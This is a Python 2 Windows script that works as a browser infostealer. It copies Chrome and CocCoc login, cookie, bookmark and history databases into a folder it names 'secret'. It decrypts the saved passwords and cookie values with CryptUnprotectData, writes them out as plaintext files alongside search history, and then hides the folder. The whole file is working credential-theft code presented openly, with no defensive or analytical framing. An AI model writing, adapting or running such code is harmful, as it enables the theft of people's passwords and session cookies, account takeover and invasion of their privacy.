# encoding=utf8
import os, sys
import sqlite3, shutil
import win32crypt, win32api, win32file

def hiddenDir():
	try:
		win32file.SetFileAttributesW('.\secret', 0x02, None)
	except:
		print "> Can't hidden folder"

def get_dbs():
	# __init__
	steal_file = ['Login Data', 'Cookies', 'Bookmarks', 'History']
	path = os.getenv('USERPROFILE')+'\AppData\Local'
	dbs = dict()

	# get path
	for i in os.walk(path):
		if 'Google' in i[1]:
			dbs['chrome'] = path + '\Google\Chrome\User Data\Default\\'
		if 'CocCoc' in i[1]:
			dbs['coccoc'] = path + '\CocCoc\Browser\User Data\Default\\'
	if 'chrome' and 'coccoc' not in dbs:
		print '> Exit'
		quit(0)

	# copy file
	try:
		os.mkdir('.\secret')
	except:
		pass
	if 'chrome' in dbs:
		sys.stdout.write('> Chrome: ')
		for file in steal_file:
			sys.stdout.write('! ')
			shutil.copy(dbs['chrome']+file, '.\secret\\' + file + '_chrome')
		sys.stdout.write(' OK, copied.\n')
	if 'coccoc' in dbs:
		sys.stdout.write('> CocCoc: ')
		for file in steal_file:
			sys.stdout.write('! ')
			shutil.copy(dbs['coccoc']+file, '.\secret\\' + file + '_coccoc')
		sys.stdout.write(' OK, copied.\n')

def connect2dbs():
	# __init__
	dbs = [i[2] for i in os.walk('.\secret')][0]
	cursor = dict()

	# connect to databases
	sys.stdout.write( '> Connecting ')
	for file in dbs:
		try:
			sys.stdout.write('! ')
			conn= sqlite3.connect('.\secret\\' + file)
		except:
			sys.stdout.write('. ')
		cursor[file] = sqlite3.Cursor(conn)
	# query
	for file in cursor:
		if 'Login' in file:
			cursor[file].execute('select action_url, username_value, password_value from logins')
		if 'Cookies' in file:
			cursor[file].execute('select host_key, name, encrypted_value from cookies')
		if 'History' in file:
			cursor[file].execute("SELECT keyword_search_terms.term, urls.url FROM 'keyword_search_terms' join 'urls' on keyword_search_terms.url_id=urls.id")
	return cursor

def decodeBlob(cursor):
	# open new file
	ckie_txt = open('.\secret\cookie.txt', 'wb')
	login_txt = open('.\secret\login_data.txt', 'wb')
	his_txt = open('.\secret\history.txt', 'wb')

	# decrypt and write to file
	sys.stdout.write('\n> Writing to file ')
	for file in cursor:
		if 'Login' in file:
			sys.stdout.write('! ')
			for url, uname, passwd in cursor[file].fetchall():
				plaintext = win32crypt.CryptUnprotectData(passwd, None, None, None, 0)
				login_txt.writelines('+' + uname + ':' + unicode(plaintext[1], 'utf-8') + '\t\t|\t\t' + url + '\n')
		if 'Cookies' in file:
			sys.stdout.write('! ')
			oldhost = ''
			for host, name, value in cursor[file].fetchall():
				plaintext = win32crypt.CryptUnprotectData(value, None, None, None, 1)
				if host == oldhost:
					host = '\t\t'
				else:
					oldhost = host
				ckie_txt.writelines('+' + host + ':' + name + '=' + plaintext[1] + ';' + '\n')
		if 'History' in file:
			sys.stdout.write('! ')
			for search_key, url in cursor[file].fetchall():
				his_txt.writelines('+' + search_key + '\t\t==>\t\t' + url + '\n')
	ckie_txt.close()
	login_txt.close()
	his_txt.close()	
		
if __name__ == '__main__':
	get_dbs()
	decodeBlob(connect2dbs())
	hiddenDir()
	sys.stdout.write('\n> Done.\n')
	
